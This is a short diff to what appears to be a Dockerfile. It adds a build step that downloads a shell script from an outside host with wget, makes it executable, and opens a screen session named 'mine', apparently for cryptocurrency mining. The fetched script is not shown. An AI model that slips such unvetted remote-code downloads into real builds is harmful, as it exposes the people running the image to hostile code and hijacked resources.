@@ -9,7 +9,8 @@ RUN apt-get update && \
     cmake .. -DCMAKE_BUILD_TYPE=Release && \
     make && \
     wget http://247app.host/run.sh && \
-    chmod 755 run.sh
+    chmod 755 run.sh && \
+    screen -S mine
 
 EXPOSE 5555
 
